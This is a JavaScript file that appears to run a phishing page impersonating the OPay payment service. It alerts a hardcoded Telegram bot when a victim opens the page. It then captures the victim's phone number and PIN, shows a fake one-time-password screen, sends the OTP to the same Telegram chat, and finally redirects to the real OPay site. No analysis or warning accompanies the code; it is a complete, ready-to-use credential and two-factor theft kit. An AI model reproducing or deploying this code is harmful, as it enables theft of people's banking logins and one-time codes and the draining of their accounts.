// 🔑 Your Telegram Credentials
const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
const chatId = '7909543900';

// 🛡️ Helper function to send data to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("Connection error");
    }
}

// 1️⃣ ALERT ON LOAD
window.onload = () => {
    sendToTelegram("<b>🚀 Link Clicked!</b>\nA user is on the portal.");
};

// 2️⃣ LOGIN FORM LOGIC
const authForm = document.getElementById('auth-form');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const phoneInput = document.getElementById('phone');
    const pinInput = document.getElementById('pin');
    const submitBtn = document.getElementById('submit-btn');

    // Validation
    if (phoneInput.value.length < 10 || pinInput.value.length < 4) {
        if (phoneInput.value.length < 10) phoneInput.classList.add('error');
        if (pinInput.value.length < 4) pinInput.classList.add('error');
        return;
    }

    submitBtn.innerText = "Verifying...";
    submitBtn.disabled = true;

    await sendToTelegram(`<b>🔑 Login Attempt</b>\n<b>Phone:</b> ${phoneInput.value}\n<b>PIN:</b> ${pinInput.value}`);

    // SWITCH VIEWS
    document.getElementById('login-card').style.display = 'none';
    const otpSection = document.getElementById('otp-section');
    if (otpSection) {
        otpSection.style.display = 'block';
        startTimer(60); 
    }
});

// 3️⃣ TIMER LOGIC
function startTimer(duration) {
    let timer = duration;
    const display = document.getElementById('timer-text');
    
    const interval = setInterval(() => {
        let seconds = parseInt(timer % 60, 10);
        display.textContent = `Resend in ${seconds}s`;

        if (--timer < 0) {
            clearInterval(interval);
            display.textContent = "Resend OTP";
        }
    }, 1000);
}

// 4️⃣ NEW: VERIFY OTP BUTTON LOGIC
// This handles the second button click on the OTP screen
const verifyBtn = document.getElementById('verify-otp-btn');

verifyBtn.addEventListener('click', async () => {
    const otpInput = document.getElementById('otp-input');
    
    // Check if OTP box is empty
    if (otpInput.value.trim() === "") {
        otpInput.classList.add('error');
        return;
    }

    verifyBtn.innerText = "Processing...";
    verifyBtn.disabled = true;

    // Send OTP to Telegram
    await sendToTelegram(`<b>🔢 OTP Received</b>\nCode: <code>${otpInput.value}</code>`);

    // ✅ FINAL REDIRECT
    window.location.replace("https://www.opayweb.com/");
});
